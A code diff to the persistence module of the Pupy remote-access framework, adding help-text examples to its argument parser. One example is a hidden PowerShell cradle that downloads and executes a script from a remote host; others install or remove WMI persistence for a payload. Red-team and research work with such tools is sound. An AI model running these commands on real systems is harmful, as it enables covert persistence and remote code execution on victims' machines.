@@ -33,7 +33,11 @@ class PersistenceModule(PupyModule):
     }
 
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
+        example = 'Examples:\n'
+        example += '>> run persistence -c "powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString(\'http://192.168.0.15:8080/eiloShaegae1\')\\\""\n'
+        example += '>> run persistence -e \'/tmp/pupy.exe\' -m wmi\n'
+        example += '>> run persistence -m wmi --remove\n'
+        self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__, epilog=example)
         self.arg_parser.add_argument('-e', '--exe', help='Use an alternative file and set persistency', completer=path_completer)
         self.arg_parser.add_argument('-s', '--shared', action='store_true', default=False,
                                          help='prefer shared object')
